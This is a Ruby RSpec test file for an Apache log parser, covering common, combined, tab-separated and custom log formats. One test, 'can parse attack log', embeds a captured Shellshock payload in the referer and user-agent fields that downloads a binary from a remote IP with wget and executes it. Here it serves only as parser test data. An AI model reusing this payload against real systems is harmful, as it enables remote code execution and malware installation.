require 'spec_helper'
require 'date'

describe ApacheLog::Parser do

  it 'has a version number' do
    expect(ApacheLog::Parser::VERSION).not_to be nil
  end

  it 'can parse common format log' do
    line = '127.0.0.1 - - [20/May/2014:20:04:04 +0900] "GET /test/indx.html HTTP/1.1" 200 4576'
    parser = ApacheLog::Parser.new('common')
    entity = parser.parse(line.chomp)
    expect = {remote_host: '127.0.0.1', identity_check: '-', user: '-', datetime: DateTime.new(2014, 5, 20, 20, 04, 04, 0.375),
      request: {method: 'GET', path: '/test/indx.html', protocol: 'HTTP/1.1'}, status: '200', size: '4576'}
    expect(entity).to eq(expect)
  end

  it 'can parse ipv6 common format log' do
    line = '::1 - - [20/May/2014:20:04:04 +0900] "GET /test/indx.html HTTP/1.1" 200 4576'
    parser = ApacheLog::Parser.new('common')
    entity = parser.parse(line.chomp)
    expect = {remote_host: '::1', identity_check: '-', user: '-', datetime: DateTime.new(2014, 5, 20, 20, 04, 04, 0.375),
      request: {method: 'GET', path: '/test/indx.html', protocol: 'HTTP/1.1'}, status: '200', size: '4576'}
    expect(entity).to eq(expect)
  end

  it 'can parse tab separated common format log' do
    line = "192.168.0.1\t-\t-\t[07/Feb/2011:10:59:59 +0900]\t\"GET /x/i.cgi/net/0000/ HTTP/1.1\"\t200\t9891";
    parser = ApacheLog::Parser.new('common')
    entity = parser.parse(line.chomp)
    expect = {remote_host: '192.168.0.1', identity_check: '-', user: '-', datetime: DateTime.new(2011, 2, 07, 10, 59, 59, 0.375),
      request: {method: 'GET', path: '/x/i.cgi/net/0000/', protocol: 'HTTP/1.1'}, status: '200', size: '9891'}
    expect(entity).to eq(expect)
  end

  it 'can parse combined format log' do
    line = '192.168.0.1 - - [07/Jun/2014:14:58:55 +0900] "GET /category/electronics HTTP/1.1" 200 128 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"'
    parser = ApacheLog::Parser.new('combined')
    entity = parser.parse(line.chomp)
    expect = {remote_host: '192.168.0.1', identity_check: '-', user: '-', datetime: DateTime.new(2014, 6, 7, 14, 58, 55, 0.375),
      request: {method: 'GET', path: '/category/electronics', protocol: 'HTTP/1.1'}, status: '200', size: '128', referer: '-',
      user_agent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0.1) Gecko/20100101 Firefox/9.0.1'}
    expect(entity).to eq(expect)
  end

  it 'can parse combined format log' do
    line = '192.168.0.1 - - [07/Feb/2011:10:59:59 +0900] "GET /x/i.cgi/net/0000/ HTTP/1.1" 200 9891 "-" "DoCoMo/2.0 P03B(c500;TB;W24H16)"';
    parser = ApacheLog::Parser.new('combined')
    entity = parser.parse(line.chomp)
    expect = {remote_host: '192.168.0.1', identity_check: '-', user:'-', datetime: DateTime.new(2011, 2, 7, 10, 59, 59, 0.375),
      request: {method: 'GET', path: '/x/i.cgi/net/0000/', protocol: 'HTTP/1.1'}, status: '200', size: '9891', referer: '-',
      user_agent: 'DoCoMo/2.0 P03B(c500;TB;W24H16)'}
    expect(entity).to eq(expect)
  end

  it 'can parse combined log with blank referer' do
    line = '192.168.0.1 - - [07/Feb/2011:10:59:59 +0900] "GET /x/i.cgi/net/0000/ HTTP/1.1" 200 9891 "" "DoCoMo/2.0 P03B(c500;TB;W24H16)"';
    parser = ApacheLog::Parser.new('combined')
    entity = parser.parse(line.chomp)
    expect = {remote_host: '192.168.0.1', identity_check: '-', user:'-', datetime: DateTime.new(2011, 2, 7, 10, 59, 59, 0.375),
      request: {method: 'GET', path: '/x/i.cgi/net/0000/', protocol: 'HTTP/1.1'}, status: '200', size: '9891', referer: '',
      user_agent: 'DoCoMo/2.0 P03B(c500;TB;W24H16)'}
    expect(entity).to eq(expect)
  end

  it 'can parse combined log with blank user agent' do
    line = '192.168.0.1 - - [07/Feb/2011:10:59:59 +0900] "GET /x/i.cgi/net/0000/ HTTP/1.1" 200 9891 "-" ""';
    parser = ApacheLog::Parser.new('combined')
    entity = parser.parse(line.chomp)
    expect = {remote_host: '192.168.0.1', identity_check: '-', user:'-', datetime: DateTime.new(2011, 2, 7, 10, 59, 59, 0.375),
      request: {method: 'GET', path: '/x/i.cgi/net/0000/', protocol: 'HTTP/1.1'}, status: '200', size: '9891', referer: '-',
      user_agent: ''}
    expect(entity).to eq(expect)
  end

  it 'can parse attack log' do
    line = '121.207.230.74 - - [13/Apr/2015:08:21:54 +0900] "GET / HTTP/1.1" 200 2392 "() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://61.160.212.172:911/java -O /tmp/China.Z-orwj >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-orwj >> /tmp/Run.sh;echo /tmp/China.Z-orwj >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\"" "() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://61.160.212.172:911/java -O /tmp/China.Z-orwj >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-orwj >> /tmp/Run.sh;echo /tmp/China.Z-orwj >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\""'
    parser = ApacheLog::Parser.new('combined')
    entity = parser.parse(line.chomp)
    expect = {remote_host: '121.207.230.74', identity_check: '-', user: '-',  datetime: DateTime.new(2015, 4, 13, 8,21,54, 0.375),
      request: {method: 'GET', path: '/', protocol: 'HTTP/1.1' }, status: '200', size: '2392', referer: '() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://61.160.212.172:911/java -O /tmp/China.Z-orwj >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-orwj >> /tmp/Run.sh;echo /tmp/China.Z-orwj >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\"',
      user_agent: '() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://61.160.212.172:911/java -O /tmp/China.Z-orwj >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-orwj >> /tmp/Run.sh;echo /tmp/China.Z-orwj >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\"'}
    expect(entity).to eq(expect)
  end

  it 'can parse tab separated combined format log' do
    line = "192.168.0.1\t-\t-\t[07/Feb/2011:10:59:59 +0900]\t\"GET /x/i.cgi/movie/0001/-0002 HTTP/1.1\"\t200\t14462\t\"-\"\t\"DoCoMo/2.0 F08A3(c500;TB;W30H20)\"";
    parser = ApacheLog::Parser.new('combined')
    entity = parser.parse(line.chomp)
    expect = {remote_host: '192.168.0.1', identity_check: '-', user:'-', datetime: DateTime.new(2011, 2, 7, 10, 59, 59, 0.375),
      request: {method: 'GET', path: '/x/i.cgi/movie/0001/-0002', protocol: 'HTTP/1.1'}, status: '200', size: '14462', referer: '-',
      user_agent: 'DoCoMo/2.0 F08A3(c500;TB;W30H20)'}
    expect(entity).to eq(expect)
  end

  it 'can parse custom format log based on combined format' do
    line = '192.168.0.1 - - [07/Jun/2014:14:58:55 +0900] "GET /category/electronics HTTP/1.1" 200 128 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0.1) Gecko/20100101 Firefox/9.0.1" "example.com" "192.168.0.1201102091208001" "901"'
    parser = ApacheLog::Parser.new('combined', %w(vhost usertrack request_duration))
    entity = parser.parse(line.chomp)
    expect = {remote_host: '192.168.0.1', identity_check: '-', user: '-', datetime: DateTime.new(2014, 6, 7, 14, 58, 55, 0.375),
      request: {method: 'GET', path: '/category/electronics', protocol: 'HTTP/1.1'}, status: '200', size: '128', referer: '-',
      user_agent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0.1) Gecko/20100101 Firefox/9.0.1', vhost: 'example.com',
      usertrack: '192.168.0.1201102091208001', request_duration: '901'}
    expect(entity).to eq(expect)
  end

  it 'can parse custom format log based on combined format' do
    line = '192.168.0.1 - - [07/Feb/2011:10:59:59 +0900] "GET /x/i.cgi/net/0000/ HTTP/1.1" 200 9891 "-" "DoCoMo/2.0 P03B(c500;TB;W24H16)" virtualhost.example.jp "192.0.2.16794832933550" "09011112222333_xx.ezweb.ne.jp" 533593';
    parser = ApacheLog::Parser.new('combined', %w(vhost usertrack mobileid request_duration))
    entity = parser.parse(line.chomp)
    expect = {remote_host: '192.168.0.1', identity_check: '-', user: '-', datetime: DateTime.new(2011, 2, 7, 10, 59, 59, 0.375),
      request: {method: 'GET', path: '/x/i.cgi/net/0000/', protocol: 'HTTP/1.1'}, status: '200', size: '9891', referer: '-',
      user_agent: 'DoCoMo/2.0 P03B(c500;TB;W24H16)', vhost: 'virtualhost.example.jp',
      usertrack: '192.0.2.16794832933550', mobileid: '09011112222333_xx.ezweb.ne.jp', request_duration: '533593'}
    expect(entity).to eq(expect)
  end

  it 'can parse tab separated custom format log based on combined format' do
    line = "192.168.0.1\t-\t-\t[07/Feb/2011:10:59:59 +0900]\t\"GET /x/i.cgi/movie/0001/-0002 HTTP/1.1\"\t200\t14462\t\"http://headlines.yahoo.co.jp/hl\"\t\"DoCoMo/2.0 F08A3(c500;TB;W30H20)\"\t\"virtualhost.example.jp\"\t\"192.0.2.16794832933550\"\t\"09011112222333_xx.ezweb.ne.jp\"\t533593";
    parser = ApacheLog::Parser.new('combined', %w(vhost usertrack mobileid request_duration))
    entity = parser.parse(line.chomp)
    expect = {remote_host: '192.168.0.1', identity_check: '-', user: '-', datetime: DateTime.new(2011, 2, 7, 10, 59, 59, 0.375),
      request: {method: 'GET', path: '/x/i.cgi/movie/0001/-0002', protocol: 'HTTP/1.1'}, status: '200', size: '14462', referer: 'http://headlines.yahoo.co.jp/hl',
      user_agent: 'DoCoMo/2.0 F08A3(c500;TB;W30H20)', vhost: 'virtualhost.example.jp',
      usertrack: '192.0.2.16794832933550', mobileid: '09011112222333_xx.ezweb.ne.jp', request_duration: '533593'}
    expect(entity).to eq(expect)
  end

  it 'can parse even if there are any columns at the beginning of line' do
    line = 'foo 127.0.0.1 - - [20/May/2014:20:04:04 +0900] "GET /test/indx.html HTTP/1.1" 200 4576'
    parser = ApacheLog::Parser.new('common')
    entity = parser.parse(line.chomp)
    expect = {remote_host: '127.0.0.1', identity_check: '-', user: '-', datetime: DateTime.new(2014, 5, 20, 20, 04, 04, 0.375),
      request: {method: 'GET', path: '/test/indx.html', protocol: 'HTTP/1.1'}, status: '200', size: '4576'}
    expect(entity).to eq(expect)
  end

  it 'can parse even if there are any columns at the beginning of line' do
    line = '200 127.0.0.1 - - [20/May/2014:20:04:04 +0900] "GET /test/indx.html HTTP/1.1" 200 4576'
    parser = ApacheLog::Parser.new('common')
    entity = parser.parse(line.chomp)
    expect = {remote_host: '127.0.0.1', identity_check: '-', user: '-', datetime: DateTime.new(2014, 5, 20, 20, 04, 04, 0.375),
      request: {method: 'GET', path: '/test/indx.html', protocol: 'HTTP/1.1'}, status: '200', size: '4576'}
    expect(entity).to eq(expect)
  end

  it 'can parse even if there are any columns at the beginning of line' do
    line = '200 foo 192.168.0.1 - - [07/Jun/2014:14:58:55 +0900] "GET /category/electronics HTTP/1.1" 200 128 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"'
    parser = ApacheLog::Parser.new('combined')
    entity = parser.parse(line.chomp)
    expect = {remote_host: '192.168.0.1', identity_check: '-', user: '-', datetime: DateTime.new(2014, 6, 7, 14, 58, 55, 0.375),
      request: {method: 'GET', path: '/category/electronics', protocol: 'HTTP/1.1'}, status: '200', size: '128', referer: '-',
      user_agent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0.1) Gecko/20100101 Firefox/9.0.1'}
    expect(entity).to eq(expect)
  end

  it 'can parse even if there are any columns at the end of line' do
    line = '192.168.0.1 - - [07/Jun/2014:14:58:55 +0900] "GET /category/electronics HTTP/1.1" 200 128 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"'
    parser = ApacheLog::Parser.new('combined')
    entity = parser.parse(line.chomp)
    expect = {remote_host: '192.168.0.1', identity_check: '-', user: '-', datetime: DateTime.new(2014, 6, 7, 14, 58, 55, 0.375),
      request: {method: 'GET', path: '/category/electronics', protocol: 'HTTP/1.1'}, status: '200', size: '128', referer: '-',
      user_agent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0.1) Gecko/20100101 Firefox/9.0.1'}
    expect(entity).to eq(expect)
  end
end
